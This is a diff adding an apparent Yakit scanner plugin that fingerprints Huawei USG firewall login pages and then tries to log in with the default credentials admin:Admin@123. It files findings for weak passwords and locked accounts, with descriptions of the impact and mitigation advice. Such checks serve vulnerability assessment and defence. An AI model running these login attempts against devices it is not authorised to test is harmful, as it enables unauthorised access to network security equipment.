@@ -1,0 +1,89 @@
+yakit.AutoInitYakit()
+handle = result => {
+    // servicescan
+    if !result.IsOpen() {
+        yakit.Info("Port: %v is not open" % result.Target)
+        return
+    }
+
+    dump(result.Fingerprint.HttpFlows)
+    if len(result.Fingerprint.HttpFlows) <= 0 {
+        return
+    }
+
+    flow = result.Fingerprint.HttpFlows[0]
+    https = flow.IsHTTPS
+
+    if !str.MatchAllOfSubString(string(flow.ResponseBody), "UI_component/ctrl/Window.js", "UI_component/ctrl/FormPanel.js", "UI_component/ctrl/PanelSuperclass.js", "sweb-lib/login/Login.js") {
+        return
+    }
+
+    url = str.ExtractURLFromHTTPRequestRaw(flow.RequestHeader, https)~
+    url = url.String()
+    risk.NewRisk(
+        url, 
+        risk.title("Fingerprint: HUAWEI USG Login " + url), risk.titleVerbose("指纹信息-华为USG登陆后台 " + url),
+        risk.severity("info"),
+        risk.request(flow.RequestHeader),
+        risk.response(poc.ReplaceBody(flow.ResponseHeader, flow.ResponseHeader, false)),
+        risk.type("fingerprint"), risk.typeVerbose("指纹信息"),
+    )
+
+    yakit.Info(f"${result.Target}: 启动默认登陆程序：" + url)
+    rsp, req, err = poc.HTTP(fuzz.Strings(f`POST /default.html?dc=1686731335 HTTP/1.1
+Host: ${result.Target}:${result.Port}
+Content-Length: 124
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+X-Requested-With: XMLHttpRequest
+
+spring-security-redirect=&language=zh_CN&username={{urlesc({{base64(admin)}})}}&password={{urlesc({{base64(Admin@123)}})}}&isLogin=true&platcontent=&platcontentConfirm=`)[0], poc.https(https), poc.retryTimes(3))
+    if err != nil {
+        yakit.Error(f"${err}")
+        return
+    }
+    rspIns = poc.ParseBytesToHTTPResponse(rsp)~
+    statusCode = rspIns.StatusCode
+    if statusCode == 401 {
+        risk.NewRisk(
+            url, 
+            risk.title(f"User Account Locked: HUAWEI USG Login(${admin}) ${url}"), risk.titleVerbose(f"华为USG登陆账户被锁（admin）${url}"),
+            risk.severity("info"),
+            risk.request(req),
+            risk.response(rsp),
+            risk.type("info"), 
+        )
+    } else if statusCode > 500 {
+        yakit.Info(f"${url} admin:Admin@123 登录失败：密码错误")
+        println(string(req))
+        println(string(rsp))
+    } else if statusCode == 200 {
+        yakit.Info(f"登录成功: ${url} admin:Admin@123")
+        risk.NewRisk(
+            url, 
+            risk.titleVerbose(f"华为 USG 弱口令: admin:Admin@123 (${url})"), 
+            risk.title(f"HUAWEI USG Weak Password: admin:Admin@123 (${url})"),
+            risk.severity("high"),
+            risk.request(req),
+            risk.response(rsp),
+            risk.payload("admin:Admin@123"),
+            risk.description(`华为 USG（Unified Security Gateway，统一安全网关）是一种网络安全设备，用于保护企业网络免受外部攻击。如果未经授权的用户或攻击者成功登录华为 USG 后台，可能会导致以下危害：
+
+1. 网络安全策略篡改：攻击者可能会修改或禁用安全策略，从而绕过防火墙、入侵检测和防止系统等安全措施。
+2. 数据泄露：攻击者可能会访问和窃取敏感信息，如企业内部数据、用户凭据和其他重要资料。
+3. 网络攻击：攻击者可能会利用登录权限在内部网络中发起攻击，例如分布式拒绝服务（DDoS）攻击、僵尸网络操控或其他恶意行为。
+4. 恶意软件传播：攻击者可能会利用登录权限在网络中传播恶意软件，如勒索软件、木马病毒等。
+5. 系统破坏：攻击者可能会故意破坏或损坏网络设备，导致系统崩溃或不稳定。`),
+            risk.solution(`为了防止这些危害，应采取以下措施保护华为 USG 后台：
+
+1. 强化身份验证：使用强大且独特的密码，并启用多因素身份验证（MFA）以增加登录安全性。
+2. 限制访问权限：仅授权必要的用户访问后台，并使用最小权限原则分配权限。
+3. 监控和审计：定期监控和审计后台活动，以便及时发现可疑行为并采取相应措施。
+4. 定期更新：确保设备及其组件保持最新，以修复已知安全漏洞。
+5. 安全培训：对员工进行安全意识培训，以提高防范网络攻击的能力。`),
+            risk.details({"username": "admin", "password": "Admin@123"})
+        )
+    }
+}
+
+
